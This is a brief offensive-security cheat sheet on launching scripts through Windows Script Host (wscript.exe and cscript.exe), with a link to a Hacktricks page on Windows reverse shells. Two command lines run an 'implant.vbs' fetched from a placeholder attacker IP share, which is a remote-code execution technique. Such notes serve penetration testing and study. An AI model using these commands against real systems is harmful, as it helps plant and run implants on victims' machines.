# Windows Scripting Host

## VBScript

```
C:\> wscript.exe <script.js | script.vbs>

C:\> wscript.exe //E:vbscript \\<attacker_IP>\path\to\implant.vbs
```

## JScript Dialect

```
C:\> cscript.exe <script.js | script.vbs | script.cs>

C:\> cscript.exe //E:jscript \\<attacker_IP>\path\to\implant.vbs
```

---
## References

### Hacktricks

- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/windows.html)